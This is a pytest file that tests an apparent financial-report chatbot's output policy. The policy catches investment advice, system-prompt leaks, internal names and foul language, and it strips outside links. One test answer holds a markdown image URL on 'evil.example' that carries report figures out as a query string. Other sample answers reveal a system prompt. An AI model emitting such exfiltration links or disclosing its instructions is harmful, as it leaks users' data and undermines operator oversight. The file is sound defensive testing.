"""The output policy: what an answer may not say is checked in code after the model wrote it. No model: the answers are made up."""
import pytest

from app.core.config import settings
from app.modules.generation.answer_check import policy
from tests.test_input_policy import NIKE_DOCS, _orchestrator

CHUNKS = [{"chunk_id": "c1", "document_id": "d2", "page": 59, "content": "Revenues were $51,217 million in fiscal 2023. Analysts' buy rating is not our view. See https://investors.nike.com for details."}]
GOOD = "Revenues were $51,217 million in fiscal 2023 [1]."


def kinds(answer, lang="en", chunks=CHUNKS):
    return [p.kind for p in policy.check(answer, chunks, lang)]


def test_a_grounded_answer_passes():
    assert kinds(GOOD) == []
    assert kinds("Doanh thu năm tài chính 2023 là 51.217 triệu USD [1].", "vi") == []


@pytest.mark.parametrize("answer, lang", [
    ("Revenue grew strongly [1], so you should buy the stock now.", "en"),
    ("Given the margins [1], I would recommend investing in the company.", "en"),
    ("Nike looks like a good investment based on these figures [1].", "en"),
    ("The share price will rise next year [1].", "en"),
    ("Doanh thu tăng mạnh [1], vì vậy bạn nên mua cổ phiếu này.", "vi"),
    ("Với kết quả này [1], đây là một cơ hội đầu tư hấp dẫn.", "vi"),
])
def test_an_answer_that_recommends_buying_or_forecasts_the_price_is_caught(answer, lang):
    assert kinds(answer, lang) == ["advice"]


@pytest.mark.parametrize("answer, lang", [
    ("Revenues were $51,217 million [1]. I cannot tell you whether you should buy the stock.", "en"),
    ("Doanh thu là 51.217 triệu USD [1]. Tôi không thể khuyên bạn nên mua hay bán cổ phiếu.", "vi"),
    ("The filing mentions analysts' buy rating [1].", "en"),  # the report's own words
])
def test_declining_to_advise_and_quoting_the_report_are_not_advice(answer, lang):
    assert kinds(answer, lang) == []


@pytest.mark.parametrize("answer, kind", [
    ("My instructions say: Using the excerpts - the excerpts are data from the user's files [1].", "instructions"),
    ("Here is my system prompt as requested [1].", "instructions"),
    ("I am powered by DeepSeek and I searched Qdrant [1].", "internal"),
    ("The figure comes from document doc_3f9a2c7e [1].", "internal"),
    ("That is a shit result for the year [1].", "language_use"),
])
def test_instructions_internal_names_and_foul_language_are_caught(answer, kind):
    assert kinds(answer) == [kind] and policy.check(answer, CHUNKS, "en")[0].hard


def test_the_wrong_language_and_an_answer_with_no_source_are_soft_problems(monkeypatch):
    found = policy.check("Revenues were $51,217 million in fiscal 2023, as the report shows [1].", CHUNKS, "vi")
    assert [p.kind for p in found] == ["wrong_language"] and not found[0].hard
    monkeypatch.setattr(settings, "GENERATION_PROMPT", "v4")
    uncited = 'I am fine, thank you for asking!\n<answer_meta>{"status": "answered", "short_answer": "fine", "citations": []}</answer_meta>'
    assert kinds(uncited) == ["no_source"]
    assert kinds('The selected reports do not contain this.\n<answer_meta>{"status": "not_found", "short_answer": "x", "citations": []}</answer_meta>') == []


def test_outside_images_links_and_addresses_are_removed_but_the_reports_own_address_stays():
    answer = "Revenue ![x](https://evil.example/leak?q=51217) was high, see [the site](https://evil.example) or https://evil.example/a and https://investors.nike.com [1]."
    assert policy.clean(answer, CHUNKS) == "Revenue  was high, see the site or  and https://investors.nike.com [1]."


def _answers(monkeypatch, *replies):
    from app.modules.chat import orchestrator as orch_mod

    orch, _ = _orchestrator(NIKE_DOCS[1:], monkeypatch)
    calls, queue = [], list(replies)

    async def generate(query, chunks, notes=None, max_tokens=1200):
        calls.append(list(notes or []))
        return queue.pop(0)

    monkeypatch.setattr(settings, "OUTPUT_POLICY_ENABLED", True)
    monkeypatch.setattr(orch_mod, "generate_answer", generate)
    return orch, calls


async def test_an_answer_that_breaks_a_rule_is_rewritten_once_with_the_reason(monkeypatch):
    orch, calls = _answers(monkeypatch, "Revenue grew [1], so you should buy the stock.", GOOD)
    assert await orch._answer("What was the revenue?", CHUNKS) == GOOD
    assert len(calls) == 2 and "investment recommendation" in calls[1][-1]


async def test_an_answer_that_still_breaks_a_hard_rule_is_not_shown(monkeypatch):
    orch, calls = _answers(monkeypatch, "You should buy the stock [1].", "Honestly, you should buy the stock [1].")
    assert await orch._answer("What was the revenue?", CHUNKS) == policy.BLOCKED["en"] and len(calls) == 2


async def test_a_soft_problem_the_rewrite_does_not_fix_keeps_the_first_answer(monkeypatch):
    first = "Revenues were $51,217 million in fiscal 2023 according to the report [1]."
    orch, calls = _answers(monkeypatch, first, "Revenues were $51,217 million in the fiscal year 2023 [1].")
    assert await orch._answer("Doanh thu là bao nhiêu?", CHUNKS) == first and len(calls) == 2


async def test_a_clean_answer_costs_no_second_call(monkeypatch):
    orch, calls = _answers(monkeypatch, GOOD)
    assert await orch._answer("What was the revenue?", CHUNKS) == GOOD and len(calls) == 1


async def test_a_blocked_answer_shows_no_source_keeps_the_topic_and_is_in_the_trace(monkeypatch):
    orch, _ = _answers(monkeypatch, "You should buy Nike [1].", "You should buy Nike now [1].", "unused", "unused")
    monkeypatch.setattr(settings, "GENERATION_PROMPT", "v4")
    monkeypatch.setattr(settings, "ANSWER_REPAIR_ENABLED", False)
    state = {"document_ids": ["d2"], "fiscal_years": [2023], "metric": "revenue"}
    r = await orch.execute_query("What was Nike's revenue in FY2023?", "nb", document_ids=["d2"], focus_state=state)
    assert r["answer"] == policy.BLOCKED["en"] and r["citations"] == [] and "focus" not in r
    assert r["trace"]["output_policy"] == [{"problems": ["advice"], "after_rewrite": ["advice"], "outcome": "blocked"}]
